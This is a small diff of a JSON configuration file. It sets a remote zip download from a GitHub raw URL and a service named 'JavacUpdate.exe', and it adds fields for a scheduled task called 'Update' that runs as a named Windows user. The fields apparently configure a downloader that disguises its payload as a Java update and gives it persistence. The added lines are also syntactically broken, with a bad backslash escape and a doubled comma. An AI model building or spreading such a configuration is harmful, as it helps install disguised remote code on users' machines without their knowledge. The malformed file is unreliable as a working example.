@@ -7,6 +7,9 @@
   "do_patch": 1,
   "download_service": "https://github.com/akramex/akramex.github.io/raw/main/publish.zip",
   "service": "false",
-  "service_name": "JavacUpdate.exe"
-  
+  "service_name": "JavacUpdate.exe",
+  "task_enable": "true",
+  "task_name": "Update",
+  "task_path": "C:\",,
+  "task_user": "WAHID-PC"
 }
